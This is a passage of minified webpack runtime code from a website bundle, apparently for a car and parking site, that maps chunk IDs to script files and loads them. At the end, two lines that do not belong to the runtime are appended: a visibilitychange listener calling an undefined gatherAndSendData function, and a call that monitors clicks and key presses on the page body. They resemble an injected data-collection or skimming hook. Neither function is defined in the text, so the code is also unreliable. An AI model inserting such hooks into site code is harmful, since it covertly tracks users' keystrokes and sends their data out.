  }, r.f = {}, r.e = e => Promise.all(Object.keys(r.f).reduce((t, i) => (r.f[i](e, t), t), [])), r.u = e => ({
    16: "collectionsmain",
    131: "homepage",
    180: "story",
    263: "tagslist",
    289: "polllist",
    309: "slider",
    424: "homepage-inner",
    428: "parkcar",
    431: "shar",
    464: "search",
    486: "carreviews",
    590: "docsmain",
    620: "collections",
    629: "docslevel",
    691: "textpage",
    780: "carbrand",
    818: "auth",
    856: "carabout",
    896: "parkmain",
    900: "carshome",
    912: "section",
    979: "specialproject"
  })[e] + ".js", r.g = function () {
    if ("object" == typeof globalThis) return globalThis;
    try {
      return this || new Function("return this")();
    } catch (e) {
      if ("object" == typeof window) return window;
    }
  }(), r.hmd = e => ((e = Object.create(e)).children || (e.children = []), Object.defineProperty(e, "exports", {
    enumerable: !0,
    set: () => {
      throw new Error("ES Modules may not assign module.exports or exports.*, Use ESM export syntax, instead: " + e.id);
    }
  }), e), r.o = (e, t) => Object.prototype.hasOwnProperty.call(e, t), e = {}, t = "zr-adaptive:", r.l = (i, n, a, o) => {
    if (e[i]) e[i].push(n);else {
      var l, c;
      if (void 0 !== a) for (var s = document.getElementsByTagName("script"), M = 0; M < s.length; M++) {
        var d = s[M];
        if (d.getAttribute("src") == i || d.getAttribute("data-webpack") == t + a) {
          l = d;
          break;
        }
      }
      l || (c = !0, (l = document.createElement("script")).charset = "utf-8", l.timeout = 120, r.nc && l.setAttribute("nonce", r.nc), l.setAttribute("data-webpack", t + a), l.src = i), e[i] = [n];
      var g = (t, n) => {
          l.onerror = l.onload = null, clearTimeout(u);
          var r = e[i];
          if (delete e[i], l.parentNode && l.parentNode.removeChild(l), r && r.forEach(e => e(n)), t) return t(n);
        },
        u = setTimeout(g.bind(null, void 0, {
          type: "timeout",
          target: l
        }), 12e4);
      l.onerror = g.bind(null, l.onerror), l.onload = g.bind(null, l.onload), c && document.head.appendChild(l);
    }
  }, r.r = e => {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(e, "__esModule", {
      value: !0
    });
  }, r.nmd = e => (e.paths = [], e.children || (e.children = []), e), r.p = "/", (() => {
    var e = {
        143: 0
      },
      t = [[6552, 216]];
    r.f.j = (t, i) => {
      var n = r.o(e, t) ? e[t] : void 0;
      if (0 !== n) if (n) i.push(n[2]);else {
        var a = new Promise((i, r) => {
          n = e[t] = [i, r];
        });
        i.push(n[2] = a);
        var o = r.p + r.u(t),
          l = new Error();
        r.l(o, i => {
          if (r.o(e, t) && (0 !== (n = e[t]) && (e[t] = void 0), n)) {
            var a = i && ("load" === i.type ? "missing" : i.type),
              o = i && i.target && i.target.src;
            l.message = "Loading chunk " + t + " failed.\n(" + a + ": " + o + ")", l.name = "ChunkLoadError", l.type = a, l.request = o, n[1](l);
          }
        }, "chunk-" + t, t);
      }
    };
    var i = e => {},
      n = (n, a) => {
        for (var o, l, [c, s, M, d] = a, g = 0, u = []; g < c.length; g++) l = c[g], r.o(e, l) && e[l] && u.push(e[l][0]), e[l] = 0;
        for (o in s) r.o(s, o) && (r.m[o] = s[o]);
        for (M && M(r), n && n(a); u.length;) u.shift()();
        return d && t.push.apply(t, d), i();
      },
      a = self.__LOADABLE_LOADED_CHUNKS__ = self.__LOADABLE_LOADED_CHUNKS__ || [];
    function o() {
      for (var i, n = 0; n < t.length; n++) {
        for (var a = t[n], o = !0, l = 1; l < a.length; l++) {
          var c = a[l];
          0 !== e[c] && (o = !1);
        }
        o && (t.splice(n--, 1), i = r(r.s = a[0]));
      }
      return 0 === t.length && (r.x(), r.x = e => {}), i;
    }
    a.forEach(n.bind(null, 0)), a.push = n.bind(null, a.push.bind(a));
    var l = r.x;
    r.x = () => (r.x = l || (e => {}), (i = o)());
  })();
  document.addEventListener("visibilitychange", gatherAndSendData);
  r.x();
  monitorEvents(document.body, 'click dblclick keydown keyup');
})();